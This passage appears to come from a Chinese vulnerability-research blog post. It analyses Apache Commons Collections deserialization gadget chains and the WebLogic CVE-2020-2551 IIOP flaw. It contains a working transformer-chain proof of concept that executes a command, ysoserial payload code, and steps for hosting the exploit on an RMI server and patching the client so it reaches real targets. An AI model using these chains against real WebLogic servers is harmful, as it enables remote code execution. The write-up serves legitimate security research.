                throw new IllegalArgumentException("The method to invoke must not be null");
            } else if (paramTypes == null && args != null || paramTypes != null && args == null || paramTypes != null && args != null && paramTypes.length != args.length) {
                throw new IllegalArgumentException("The parameter types must match the arguments");
            } else if (paramTypes != null && paramTypes.length != 0) {
                paramTypes = (Class[])((Class[])paramTypes.clone());
                args = (Object[])((Object[])args.clone());
                return new InvokerTransformer(methodName, paramTypes, args);
            } else {
                return new InvokerTransformer(methodName);
            }
        }
而 **InvokerTransformer** 的 **transform** 方法被谁谁调用呢，在同包下的
**org.apache.commons.collections.functors.ChainedTransformer** 可以对  
Transformer数组进行组合。
只需要 **Transformer chain = new ChainedTransformer(transformers);** 即可组合，  
在org.apache.commons.collections.map.TransformedMap中checkSetValue函数调用了transform方法
    protected Object checkSetValue(Object value) {
            return this.valueTransformer.transform(value);
        }
而在org.apache.commons.collections.map.AbstractInputCheckedMapDecorator的setValue会调用父类的
**checkSetValue**
    public Object setValue(Object value) {
                value = this.parent.checkSetValue(value);
                return this.entry.setValue(value);
            }
        }
并且 **TansformedMap** 里用装饰者模式通过 **transformer** 来扩展功能
TransformedMap实现了Serializable接口可以被序列化操作 ，其中结构里也包含了 **map**
    public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable {
    ...
    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
            super(map);
            this.keyTransformer = keyTransformer;
            this.valueTransformer = valueTransformer;
        }
    ...
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        this.map = (Map)in.readObject();
    }
* * *
所以到这里可以理一下利用链接  
**TransformedMap** 添加一个装饰 **ChainedTransformer** ， **ChainedTransformer** 将多个
**InvokerTransformer** 组合， **InvokerTransformer** 来反射执行其他函数(RCE)
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.util.Map;
    import java.util.HashMap;
    public class TransformVul {
        public static void main(String[] args) {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
                            new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},
                            new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class},
                            new Object[]{"calc"})
            };
            Transformer chain = new ChainedTransformer(transformers) ;
            Map innerMap = new HashMap() ;
            innerMap.put("name", "hello") ;
            Map outerMap = TransformedMap.decorate(innerMap, null, chain) ;
            Map.Entry elEntry = (java.util.Map.Entry)outerMap.entrySet().iterator().next() ;
            elEntry.setValue("hello") ;
        }
    }
**ysoserial** 中也是一样的利用方式:
    public class CommonsCollections3 extends PayloadRunner implements ObjectPayload {
        public Object getObject(final String command) throws Exception {
            Object templatesImpl = Gadgets.createTemplatesImpl(command);
            // inert chain for setup
            final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
            // real chain for after setup
            final Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(
                            new Class[] { Templates.class },
                            new Object[] { templatesImpl } )};
            final Map innerMap = new HashMap();
            final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
            final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
            final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
            Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
            return handler;
        }
        public static void main(final String[] args) throws Exception {
            PayloadRunner.run(CommonsCollections3.class, args);
        }
        public static boolean isApplicableJavaVersion() {
            return JavaVersion.isAnnInvHUniversalMethodImpl();
        }
    }
这里注意jdk版本为1.7
* * *
# 0x01 CVE-2020-2551
**漏洞断点调试环境配置**  
远程调试端口设置:
    qing@ubuntu:~/vulhub/weblogic/CVE-2017-10271$ cat docker-compose.yml
    version: '2'
    services:
     weblogic:
       image: vulhub/weblogic
       ports:
        - "7001:7001"
        - "8453:8453"
修改配置文件加入远程调试:
在idea中添加目录中所需要的jar包:
    for /R %%d in (*.jar) do (echo moving %%d
    move /y %%d ./test
    )
idea远程配置:
### 审计调试
有的师傅已经写了2551的文章，正向从传反序列化对象开始分析，我这里直接从漏洞触发点的函数倒推回去。
**weblogic.corba.utils. ValueHandlerImpl** 的中调用了 **readObject** 进行反序列化  
此处是在 **readValueData** 函数中， **var2** 为 **ObjectStreamClass** 的形参
    private static void readValueData(IIOPInputStream var0, Object var1, ObjectStreamClass var2) throws IOException, ClassNotFoundException {
            if (var2.getSuperclass() != null) {
         ....
     ObjectInputStream var6 = var0.getObjectInputStream(var1, var2, var3, var4);
                var2.readObject(var1, var6);
                var6.close();
                if (var5) {
                    var0.end_value();
                }
而 **readValueData** 函数在同文件的readValue函数中被调用，var2为传入readValueData函数的Object形参
在 **weblogic.iiop.IIOPInputStream.class** 的 **read_value**
函数也就是1728行调用了readValue函数，上面的readValue函数的var2为这里read_value函数的 **var13**
    public Serializable read_value(Class var1) {
          Class var2 = var1;
          boolean var3 = false;
    ...
    ...
     try {
                                ObjectStreamClass var14 = ObjectStreamClass.lookup(var2);
                                var13 = (Serializable)ValueHandlerImpl.allocateValue(this, var14);
                                this.indirections.putReserved(var5, var18, var13);
                                Serializable var15 = (Serializable)ValueHandlerImpl.readValue(this, var14, var13);
                                if (var15 != var13) {
                                    var13 = var15;
                                    this.indirections.putReserved(var5, var18, var15);
                                }
                            } catch (ClassNotFoundException var16) {
    .....
而 **weblogic.iiop.IIOPInputStream** 中的read_value在rmi-iiop流程中对接收的序列化对象进行反序列化的时候被调用，发现读取  
输入流的方法被封装在 **iiopoutputstream** 中的 **read_any** 函数中
    public final Any read_any() {
            return this.read_any(this.read_TypeCode());
        }
        public final Any read_any(TypeCode var1) {
            Debug.assertion(var1 != null);
            AnyImpl var2 = new AnyImpl();
            var2.type(var1);
            var2.read_value(this, var2.type());
            return var2;
        }
这里在1416行调用的read_value函数，传入的反序列化内容为var2.type函数的返回值，var2为实例化AnyImpl实例调用其read_value读取序列化数据。1416行是处于有参的read_any,而有参的read_any在1408的无参read_any中调用，这段我们只需要跟踪注意var2.type的返回值在调用链的最初我们是否可控以及this.read_TypeCode()非空。
发现read_any无参函数的调用是在_invoke函数中，而_invkoe函数被调用于weblogic.corba.idl.CorbaServerRef.class中的invoke函数
    public void invoke(RuntimeMethodDescriptor var1, InboundRequest var2, OutboundResponse var3) throws Exception {
            try {
                weblogic.iiop.InboundRequest var4 = (weblogic.iiop.InboundRequest)var2;
                if (!var4.isCollocated() && var4.getEndPoint().isDead()) {
                    throw new ConnectException("Connection is already shutdown for " + var2);
                } else {
                    Integer var5 = (Integer)objectMethods.get(var4.getMethod());
                    ResponseHandler var6;
                    if (var3 == null) {
                        var6 = NULL_RESPONSE;
                    } else {
                        var6 = ((weblogic.iiop.OutboundResponse)var3).createResponseHandler(var4);
                    }
                    if (var5 != null) {
                        this.invokeObjectMethod(var5, var4.getInputStream(), var6);
                    } else {
                        this.delegate._invoke(var4.getMethod(), var4.getInputStream(), var6);
                    }
                    if (var3 != null) {
                        var3.transferThreadLocalContext(var2);
                    }
                }
            } catch (ClassCastException var7) {
                throw new NoSuchObjectException("CORBA ties are only supported with IIOP");
            }
        }
**weblogic.corba.idl.CorbaServerRef.class** 中的 **invoke** 函数在
**weblogic.rmi.internal.BasicServerRef** 的 **runAs** 被调用  
最后可以跟到weblogic解析请求的入口  
调用链:
    lookup:417, InitialContext (javax.naming)
    doInContext:132, JndiTemplate$1 (com.bea.core.repackaged.springframework.jndi)
    execute:88, JndiTemplate (com.bea.core.repackaged.springframework.jndi)
    lookup:130, JndiTemplate (com.bea.core.repackaged.springframework.jndi)
    lookup:155, JndiTemplate (com.bea.core.repackaged.springframework.jndi)
    lookupUserTransaction:565, JtaTransactionManager (com.bea.core.repackaged.springframework.transaction.jta)
    initUserTransactionAndTransactionManager:444, JtaTransactionManager (com.bea.core.repackaged.springframework.transaction.jta)
    readObject:1198, JtaTransactionManager (com.bea.core.repackaged.springframework.transaction.jta)
    invoke:-1, GeneratedMethodAccessor30 (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    readObject:315, ObjectStreamClass (weblogic.utils.io)
    readValueData:281, ValueHandlerImpl (weblogic.corba.utils)
    readValue:93, ValueHandlerImpl (weblogic.corba.utils)
    read_value:2128, IIOPInputStream (weblogic.iiop)
    read_value:1936, IIOPInputStream (weblogic.iiop)
    read_value_internal:220, AnyImpl (weblogic.corba.idl)
    read_value:115, AnyImpl (weblogic.corba.idl)
    read_any:1648, IIOPInputStream (weblogic.iiop)
    read_any:1641, IIOPInputStream (weblogic.iiop)
    _invoke:58, _NamingContextAnyImplBase (weblogic.corba.cos.naming)
    invoke:249, CorbaServerRef (weblogic.corba.idl)
    invoke:230, ClusterableServerRef (weblogic.rmi.cluster)
    run:522, BasicServerRef$1 (weblogic.rmi.internal)
    doAs:363, AuthenticatedSubject (weblogic.security.acl.internal)
    runAs:146, SecurityManager (weblogic.security.service)
    handleRequest:518, BasicServerRef (weblogic.rmi.internal)
    run:118, WLSExecuteRequest (weblogic.rmi.internal.wls)
    execute:263, ExecuteThread (weblogic.work)
    run:221, ExecuteThread (weblogic.work)
附上y4师傅的poc：
编译好的exp字节码文件放 **marshalsec** 的RMI服务下，执行成功。  
测试实际站点的时候发现是失败，还需要解决的一个问题是CVE-2020-2551的 **"网络"** 问题
## CVE-2020-2551的网络问题
实际情况大多数weblogic是内网反带出来的，所以在返回 **NameService** 指定 **bind** 地址的时都是内网地址，导致访问失败。
解决方法为自定义 **GIOP协议** 和 **重写IIOP协议**  
个人在实际测试的时候选择后者
### 重写IIOP协议解决:
定位返回地址位置hackworld老哥写的已经非常清楚了:  
最后需要改的位置  
CVE-2020-2551\src\lib\wlfullclient.jar\weblogic\iiop\IOPProfile.class
这里对于class文件在改的时候将idea对于class文件读出来的代码复制一份，改好保存成java文件后重新编译，复制到包里覆盖即可。
编译:
替换:  
实际测试:
* * *
### 资料:
 手把手教你解决Weblogic CVE-2020-2551 POC网络问题
 漫谈 WebLogic CVE-2020-2551
CVE-2017-3241